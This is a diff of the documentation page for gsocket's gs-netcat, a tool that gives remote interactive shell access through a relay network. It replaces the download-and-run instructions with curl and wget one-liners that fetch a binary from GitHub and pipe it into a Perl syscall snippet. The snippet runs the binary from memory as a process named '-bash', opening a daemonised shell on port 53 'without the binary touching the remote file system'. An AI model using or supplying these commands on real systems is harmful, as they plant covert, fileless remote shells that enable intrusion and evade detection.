@@ -158,9 +158,7 @@ Useful environment variables:
 |GS_WEBHOOK_KEY=|Report to webhook.site|
 |TMPDIR=|Use a custom temporary directory. Try TMPDIR=$(pwd)|
 
-If all fails:
-
-Download the static binary from [https://github.com/hackerschoice/gsocket/releases/latest/](https://github.com/hackerschoice/gsocket/releases/latest). There also is an (unsupported) [Windows binary](https://github.com/hackerschoice/binary/blob/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip) or use [qsocket.io](https://www.qsocket.io/).
+Alternatively, start gs-netcat without the binary touching the remote file system:
 
 <div class="tabs-wrapper">
     <div class="tabs" style="height: 12.45rem;">
@@ -169,14 +167,7 @@ Download the static binary from [https://github.com/hackerschoice/gsocket/releas
             <label for="curl-manual" class="tab-label">Curl</label>
             <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
 {% highlight shell %}
-# This will not survive reboot. Temporary access only.
-killall gs; \
-curl -fsSLk -ogs https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m) \
-&& chmod 755 gs \
-&& S=$(./gs -g) \
-&& GS_PORT=53 GSOCKET_ARGS="-liD -s $S" ./gs \
-&& echo "Connect with: gs-netcat -s $S -i" \
-&& rm -f gs
+curl -SsfLk https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-$(uname -m) | GS_PORT=53 GS_ARGS="-ilD -s ChangeMe" perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"-bash"'
 {% endhighlight %}
             </div>
         </div>
@@ -185,20 +176,18 @@ curl -fsSLk -ogs https://github.com/hackerschoice/gsocket/releases/latest/downlo
             <label for="wget-manual" class="tab-label">Wget</label>
             <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
 {% highlight shell %}
-# This will not survive reboot. Temporary access only.
-killall gs; \
-wget --no-check-certificate -qOgs https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m) \
-&& chmod 755 gs \
-&& S=$(./gs -g) \
-&& GS_PORT=53 GSOCKET_ARGS="-liD -s $S" ./gs \
-&& echo "Connect with: gs-netcat -s $S -i" \
-&& rm -f gs
+wget --no-check-certificate -qOgs https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-$(uname -m) | GS_PORT=53 GS_ARGS="-ilD -s ChangeMe" perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"-bash"'
 {% endhighlight %}
             </div>
         </div>
     </div>
 </div>
-(Note: *GS_PORT=53* is only needed if port 443 is firewalled).
+
+- *GS_PORT=53* is only needed if port 443 is firewalled.
+- Change `ChangeMe` to your own secret. Don't use `ChangeMe`.
+
+Your last resort is to download and start gs-netcat manually:
+Download the static binary from [https://github.com/hackerschoice/gsocket/releases/latest/](https://github.com/hackerschoice/gsocket/releases/latest). There also is an (unsupported) [Windows binary](https://github.com/hackerschoice/binary/blob/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip) or use [qsocket.io](https://www.qsocket.io/) and start it manually with `/tmp/gs-netcat -ilD -s ChangeMe`.
 
 {:refdef: style="text-align: center;"}
 ## Advanced Tips & Tricks
